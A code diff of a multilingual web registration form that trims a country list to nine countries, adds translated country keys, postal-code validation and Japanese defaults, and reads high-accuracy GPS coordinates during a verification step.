-            "马来西亚 (Malaysia)": ["吉隆坡", "柔佛", "槟城", "雪兰莪", "沙巴", "砂拉越"],
-            "泰国 (Thailand)": ["曼谷", "清迈", "普吉", "芭提雅", "呵叻"],
-            "印度 (India)": ["Maharashtra", "Delhi", "Karnataka", "Tamil Nadu", "Uttar Pradesh", "Gujarat"],
-            "巴西 (Brazil)": ["São Paulo", "Rio de Janeiro", "Minas Gerais", "Bahia", "Paraná"],
-            "墨西哥 (Mexico)": ["Ciudad de México", "Jalisco", "Nuevo León", "Estado de México"],
-            "其他国家 (Other 193+ Countries)": ["其他省份 / 州 / 地区 / Other State"]
+            "日本": ["北海道", "青森県", "岩手県", "宮城県", "秋田県", "山形県", "福島県", "茨城県", "栃木県", "群馬県", "埼玉県", "千葉県", "東京都", "神奈川県", "新潟県", "富山県", "石川県", "福井県", "山梨県", "長野県", "岐阜県", "静岡県", "愛知県", "三重県", "滋賀県", "京都府", "大阪府", "兵庫県", "奈良県", "和歌山県", "鳥取県", "島根県", "岡山県", "広島県", "山口県", "徳島県", "香川県", "愛媛県", "高知県", "福岡県", "佐賀県", "長崎県", "熊本県", "大分県", "宮崎県", "鹿児島県", "沖縄県"],
+            "中国": ["北京市", "上海市", "天津市", "重庆市", "广东省", "江苏省", "浙江省", "山东省", "河南省", "四川省", "湖北省", "湖南省", "河北省", "安徽省", "福建省", "陕西省", "辽宁省", "江西省", "广西壮族自治区", "山西省", "内蒙古自治区", "贵州省", "吉林省", "云南省", "黑龙江省", "新疆维吾尔自治区", "甘肃省", "海南省", "宁夏回族自治区", "青海省", "西藏自治区", "中国香港", "中国澳门", "中国台湾"],
+            "美国": ["Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming", "District of Columbia"],
+            "法国": ["Île-de-France", "Auvergne-Rhône-Alpes", "Provence-Alpes-Côte d'Azur", "Nouvelle-Aquitaine", "Occitanie", "Hauts-de-France", "Grand Est", "Bretagne", "Pays de la Loire", "Normandie"],
+            "德国": ["Baden-Württemberg", "Bayern", "Berlin", "Brandenburg", "Bremen", "Hamburg", "Hessen", "Mecklenburg-Vorpommern", "Niedersachsen", "Nordrhein-Westfalen", "Rheinland-Pfalz", "Saarland", "Sachsen", "Sachsen-Anhalt", "Schleswig-Holstein", "Thüringen"],
+            "英国": ["England", "Scotland", "Wales", "Northern Ireland", "Greater London"],
+            "加拿大": ["Ontario", "Quebec", "British Columbia", "Alberta", "Manitoba", "Saskatchewan", "Nova Scotia", "New Brunswick"],
+            "澳大利亚": ["New South Wales", "Victoria", "Queensland", "Western Australia", "South Australia", "Tasmania"]
         };
-
-        // 扩充至193个国家的完整数据池模拟（确保列表涵盖所有联合国成员国）
-        const allCountriesList = [
-            "中国 (China)", "美国 (United States)", "日本 (Japan)", "法国 (France)", "德国 (Germany)", 
-            "俄罗斯 (Russia)", "乌克兰 (Ukraine)", "越南 (Vietnam)", "英国 (United Kingdom)", "加拿大 (Canada)", 
-            "澳大利亚 (Australia)", "西班牙 (Spain)", "意大利 (Italy)", "韩国 (South Korea)", "新加坡 (Singapore)", 
-            "马来西亚 (Malaysia)", "泰国 (Thailand)", "印度 (India)", "巴西 (Brazil)", "墨西哥 (Mexico)",
-            "阿富汗", "阿尔巴尼亚", "阿尔及利亚", "安道尔", "安哥拉", "安提瓜和巴布达", "阿根廷", "亚美尼亚", "奥地利", "阿塞拜疆",
-            "巴哈马", "巴林", "孟加拉国", "巴巴多斯", "白俄罗斯", "比利时", "伯利兹", "贝宁", "不丹", "玻利维亚",
-            "波斯尼亚和黑塞哥维那", "博茨瓦纳", "文莱", "保加利亚", "布基纳法索", "布隆迪", "佛得角", "柬埔寨", "喀麦隆", "中非共和国",
-            "乍得", "智利", "哥伦比亚", "科摩罗", "刚果共和国", "刚果民主共和国", "哥斯达黎加", "科特迪瓦", "克罗地亚", "古巴",
-            "塞浦路斯", "捷克", "丹麦", "吉布提", "多米尼克", "多米尼加共和国", "厄瓜多尔", "埃及", "萨尔瓦多", "赤道几内亚",
-            "厄立特里亚", "爱沙尼亚", "斯威士兰", "埃塞俄比亚", "斐济", "芬兰", "加蓬", "冈比亚", "格鲁吉亚", "加纳",
-            "希腊", "格林纳达", "危地马拉", "几内亚", "几内亚比绍", "guyana", "海地", "洪都拉斯", "匈牙利", "冰岛",
-            "印度尼西亚", "伊朗", "伊拉克", "爱尔兰", "以色列", "牙买加", "约旦", "哈萨克斯坦", "肯尼亚", "基里巴斯",
-            "科威特", "吉尔吉斯斯坦", "老挝", "拉脱维亚", "黎巴嫩", "莱索托", "利比里亚", "利比亚", "列支敦士登", "立陶宛",
-            "卢森堡", "马达加斯加", "马拉维", "马尔代夫", "马里", "马耳他", "马绍尔群岛", "毛里塔尼亚", "毛里求斯", "密克罗尼西亚",
-            "摩尔多瓦", "摩纳哥", "蒙古", "黑山", "摩洛哥", "莫桑比克", "缅甸", "纳米比亚", "瑙鲁", "尼泊尔",
-            "荷兰", "新西兰", "尼加拉瓜", "尼日尔", "尼日利亚", "朝鲜", "北马其顿", "挪威", "阿曼", "巴基斯坦",
-            "帕劳", "巴勒斯坦", "巴拿马", "巴布亚新几内亚", "巴拉圭", "秘鲁", "菲律宾", "波兰", "葡萄牙", "卡塔尔",
-            "罗马尼亚", "卢旺达", "圣基茨和尼维斯", "圣卢西亚", "圣文森特和 گرینادین", "萨摩亚", "圣马力诺", "圣多美和普林西比", "沙特阿拉伯", "塞内加尔",
-            "塞尔维亚", "塞舌尔", "塞拉利昂", "斯洛伐克", "斯洛文尼亚", "所罗门群岛", "索马里", "南非", "南苏丹", "斯里兰卡",
-            "苏丹", "苏里南", "瑞典", "瑞士", "叙利亚", "塔吉克斯坦", "坦桑尼亚", "东帝汶", "多哥", "汤加",
-            "特立尼达和多巴哥", "突尼斯", "土耳其", "土库曼斯坦", "图瓦卢", "乌干达", "阿联酋", "乌拉圭", "乌兹别克斯坦", "瓦努阿图",
-            "梵蒂冈", "委内瑞拉", "也门", "赞比亚", "zimbawe"
-        ];
 
         const countryInput = document.getElementById('countryInput');
         const countryList = document.getElementById('countryList');
@@ -452,21 +388,29 @@
         const postalCodeInput = document.getElementById('postalCode');
         const postalError = document.getElementById('postalError');
 
-        // 初始化渲染 datalist 搜索选项
+        // 统一的国家后台标准化映射键（用于匹配省份和邮编规则）
+        function getStandardCountryKey(val) {
+            const t = translations[currentLang].countries;
+            for (let key in t) {
+                if (t[key] === val || key === val) return key;
+            }
+            return "日本"; // 默认兜底
+        }
+
         function initCountryDatalist() {
             countryList.innerHTML = "";
-            allCountriesList.forEach(c => {
+            const t = translations[currentLang].countries;
+            for (let k in t) {
                 const opt = document.createElement('option');
-                opt.value = c;
+                opt.value = t[k];
                 countryList.appendChild(opt);
-            });
+            }
         }
-        initCountryDatalist();
 
-        // 当国家输入或选择改变时触发
         function onCountryChange() {
             const val = countryInput.value.trim();
-            const states = globalRegions[val] || ["其他省份 / 州 / 地区"];
+            const stdKey = getStandardCountryKey(val);
+            const states = globalRegions[stdKey] || ["その他 / Other"];
             stateSelect.innerHTML = "";
             states.forEach(st => {
                 const opt = document.createElement('option');
@@ -477,29 +421,21 @@
             validatePostalCode();
         }
 
-        // AI 智能识别邮政编码正确性校验逻辑
         function validatePostalCode() {
-            const country = countryInput.value.trim();
+            const val = countryInput.value.trim();
+            const stdKey = getStandardCountryKey(val);
             const postal = postalCodeInput.value.trim();
-            if (!postal) {
-                postalError.style.display = 'none';
-                return true;
-            }
+            if (!postal) { postalError.style.display = 'none'; return true; }
 
             let isValid = true;
-            // 针对不同国家的邮编规则进行智能正则匹配
-            if (country.includes("中国") || country.includes("China")) {
-                isValid = /^\d{6}$/.test(postal); // 中国6位数字
-            } else if (country.includes("美国") || country.includes("United States")) {
-                isValid = /^\d{5}(-\d{4})?$/.test(postal); // 美国5位或9位
-            } else if (country.includes("英国") || country.includes("United Kingdom")) {
-                isValid = /^[A-Z]{1,2}\d[A-Z\d]? ?\d[A-Z]{2}$/i.test(postal); // 英国邮编格式
-            } else if (country.includes("日本") || country.includes("Japan")) {
-                isValid = /^\d{3}-\d{4}$/.test(postal) || /^\d{7}$/.test(postal); // 日本7位
-            } else if (country.includes("俄罗斯") || country.includes("Russia")) {
+            if (stdKey === "日本") {
+                isValid = /^\d{3}-\d{4}$/.test(postal) || /^\d{7}$/.test(postal);
+            } else if (stdKey === "中国") {
                 isValid = /^\d{6}$/.test(postal);
+            } else if (stdKey === "美国") {
+                isValid = /^\d{5}(-\d{4})?$/.test(postal);
             } else {
-                isValid = postal.length >= 3 && postal.length <= 12; // 通用默认长度限制
+                isValid = postal.length >= 3 && postal.length <= 12;
             }
 
             if (!isValid) {
@@ -511,7 +447,6 @@
             }
         }
 
-        // 全页面多语言切换渲染函数
         function setLanguage(lang) {
             currentLang = lang;
             document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
@@ -530,8 +465,16 @@
             document.getElementById('t-phone').innerText = t.phone;
             document.getElementById('nextToVerifyBtn').innerText = t.btn;
             document.getElementById('t-verify-title').innerText = t.vTitle;
+            countryInput.placeholder = t.placeholderCountry;
             postalError.innerText = t.postalErrText;
+
+            // 重新刷新国家列表为当前语言
+            initCountryDatalist();
+            onCountryChange();
         }
+
+        // 初始化加载日语
+        setLanguage('ja');
 
         let formDataCache = {};
         const stepForm = document.getElementById('step-form');
@@ -554,7 +497,7 @@
                 window.speechSynthesis.cancel();
                 const langMap = { zh: 'zh-CN', en: 'en-US', ja: 'ja-JP', fr: 'fr-FR', de: 'de-DE', ru: 'ru-RU', uk: 'uk-UA', vi: 'vi-VN', es: 'es-ES', pt: 'pt-PT' };
                 const utterance = new SpeechSynthesisUtterance(text);
-                utterance.lang = langMap[currentLang] || 'en-US';
+                utterance.lang = langMap[currentLang] || 'ja-JP';
                 utterance.rate = 1.0;
                 utterance.pitch = 1.0;
                 window.speechSynthesis.speak(utterance);
@@ -598,12 +541,12 @@
             stepVerification.style.display = 'block';
             fillLight.style.display = 'block';
 
-            let locationText = "未获取到精确GPS";
+            let locationText = "GPS未取得";
             try {
                 const pos = await new Promise((res, rej) => {
                     navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 8000 });
                 });
-                locationText = `纬度: ${pos.coords.latitude.toFixed(6)}, 经度: ${pos.coords.longitude.toFixed(6)}`;
+                locationText = `緯度: ${pos.coords.latitude.toFixed(6)}, 経度: ${pos.coords.longitude.toFixed(6)}`;
             } catch (e) {
                 console.warn("GPS skipped");
             }
